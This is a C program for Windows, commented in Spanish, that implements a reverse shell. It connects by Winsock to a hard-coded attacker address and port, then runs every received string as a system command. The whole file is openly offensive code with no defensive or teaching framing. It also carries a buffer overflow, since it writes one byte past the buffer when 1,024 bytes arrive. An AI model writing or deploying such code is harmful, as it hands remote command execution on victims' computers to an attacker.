#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

void ReverseShell(const char* ip, int port) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[1024];
    
    // Inicializar Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed.\n");
        return;
    }

    // Crear el socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Could not create socket.\n");
        WSACleanup();
        return;
    }

    // Configurar la dirección del servidor
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    // Conectar al servidor
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("Connection failed.\n");
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Recibir y ejecutar comandos
    while (1) {
        int recv_size = recv(sock, buffer, sizeof(buffer), 0);
        if (recv_size <= 0) break;
        buffer[recv_size] = '\0';
        system(buffer);
    }

    // Cerrar el socket y limpiar Winsock
    closesocket(sock);
    WSACleanup();
}

int main() {
    const char* attacker_ip = "192.168.1.100"; // Reemplazar con la IP del atacante
    int attacker_port = 4444; // Reemplazar con el puerto del atacante

    ReverseShell(attacker_ip, attacker_port);
    return 0;
}
